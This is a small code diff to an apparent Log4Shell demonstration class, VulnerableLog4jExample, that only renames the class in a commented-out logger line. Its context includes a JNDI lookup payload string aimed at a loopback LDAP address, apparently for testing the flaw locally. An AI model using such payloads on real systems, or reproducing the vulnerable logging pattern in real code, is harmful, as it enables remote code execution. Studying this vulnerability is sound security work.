@@ -14,7 +14,7 @@ public class VulnerableLog4jExample {
   static Logger log = LogManager.getLogger();
 
   // Log4J rest
-//  static Logger log = Logger.getLogger(VulnerableLog4jExampleHandler.class);
+//  static Logger log = Logger.getLogger(VulnerableLog4jExample.class);
 
   public static void main(String[] args) throws IOException {
     String attackString = "${jndi:ldap://127.0.0.6/a}";
